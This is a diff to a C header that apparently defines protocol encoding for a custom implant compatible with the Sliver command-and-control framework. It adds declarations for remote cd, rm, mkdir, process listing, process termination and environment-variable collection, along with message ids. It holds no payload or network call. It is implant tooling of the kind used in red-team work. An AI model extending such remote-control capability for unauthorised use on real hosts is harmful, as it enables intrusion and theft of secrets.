@@ -119,18 +119,70 @@ int sliver_ls_req_decode(const void *data, size_t len, char *path, size_t cap);
 int sliver_ls_encode(sliver_buf_t *out, const char *path, int exists,
                      const sliver_file_info_t *files, size_t count);
 /* Pwd{Path=1, Response=9}. */
-int sliver_pwd_encode(sliver_buf_t *out, const char *path);
+int sliver_pwd_encode(sliver_buf_t *out, const char *path, const char *err);
 /* PwdReq has no fields of interest; it only carries commonpb.Request (field 9).
  * Copies that nested blob when present. */
 int sliver_request_field(const void *data, size_t len, const uint8_t **out, size_t *out_len);
+
+/* --- Cd / Rm / Mkdir --------------------------------------------------- */
+typedef struct {
+  char path[1024];
+  int recursive;
+  int force;
+} sliver_path_req_t;
+
+/* CdReq{Path=1}, RmReq{Path=1,Recursive=2,Force=3}, MkdirReq{Path=1}. */
+int sliver_path_req_decode(const void *data, size_t len, sliver_path_req_t *out);
+/* Rm/Mkdir response: {Path=1, Response=9}. */
+int sliver_path_resp_encode(sliver_buf_t *out, const char *path, const char *err);
+
+/* --- Ps / Terminate ---------------------------------------------------- */
+typedef struct {
+  int32_t pid;
+  int32_t ppid;
+  const char *exe;
+  const char *owner;
+  int32_t session_id;
+  const char *cmdline;
+  const char *arch;
+} sliver_proc_info_t;
+
+/* Ps{Processes=1 repeated commonpb.Process, Response=9}. */
+int sliver_ps_encode(sliver_buf_t *out, const sliver_proc_info_t *procs, size_t count,
+                     const char *err);
+/* TerminateReq{Pid=1, Force=2}. */
+int sliver_terminate_req_decode(const void *data, size_t len, int32_t *pid, int *force);
+/* Terminate{Pid=1, Response=9}. */
+int sliver_terminate_encode(sliver_buf_t *out, int32_t pid, const char *err);
+
+/* --- Env --------------------------------------------------------------- */
+typedef struct {
+  const char *key;
+  const char *value;
+} sliver_env_pair_t;
+
+/* EnvInfo{Variables=1 repeated commonpb.EnvVar{Key=1,Value=2}, Response=9}. */
+int sliver_env_encode(sliver_buf_t *out, const sliver_env_pair_t *vars, size_t count,
+                      const char *err);
 
 /* --- message type ids (protobuf/sliverpb/constants.go, append only) ---- */
 #define SLIVER_MSG_REGISTER 1u
 #define SLIVER_MSG_PING 3u
 #define SLIVER_MSG_LS_REQ 5u
 #define SLIVER_MSG_LS 6u
+#define SLIVER_MSG_CD_REQ 11u
 #define SLIVER_MSG_PWD_REQ 12u
 #define SLIVER_MSG_PWD 13u
+#define SLIVER_MSG_RM_REQ 14u
+#define SLIVER_MSG_RM 15u
+#define SLIVER_MSG_MKDIR_REQ 16u
+#define SLIVER_MSG_MKDIR 17u
+#define SLIVER_MSG_PS_REQ 18u
+#define SLIVER_MSG_PS 19u
+#define SLIVER_MSG_TERMINATE_REQ 45u
+#define SLIVER_MSG_TERMINATE 46u
+#define SLIVER_MSG_ENV_REQ 66u
+#define SLIVER_MSG_ENV 67u
 #define SLIVER_MSG_BEACON_REGISTER 93u
 #define SLIVER_MSG_BEACON_TASKS 94u
 
@@ -139,3 +191,4 @@ int sliver_request_field(const void *data, size_t len, const uint8_t **out, size
 #endif
 
 #endif /* SLIVER_PROTO_H */
+
